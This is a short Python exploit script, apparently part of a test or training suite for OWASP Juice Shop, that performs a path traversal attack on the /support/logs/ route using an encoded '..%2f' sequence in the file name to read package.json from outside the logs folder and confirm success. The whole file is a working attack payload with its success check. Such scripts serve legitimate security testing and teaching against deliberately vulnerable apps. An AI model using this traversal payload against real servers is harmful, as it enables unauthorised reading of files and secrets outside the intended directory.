"""Path traversal through the file name in routes/logfileServer.ts.

Mirror of key_server_path.py for /support/logs/:file. Success: the response is
Juice Shop's package.json, a file outside the logs/ folder.
"""

import urllib.error
import urllib.request


def exploit(base: str) -> tuple[bool, str]:
    try:
        with urllib.request.urlopen(f"{base}/support/logs/..%2fpackage.json") as res:
            body = res.read().decode("utf-8", "replace")
            return '"name": "juice-shop"' in body, f"HTTP {res.status}"
    except urllib.error.HTTPError as err:
        return False, f"HTTP {err.code}"
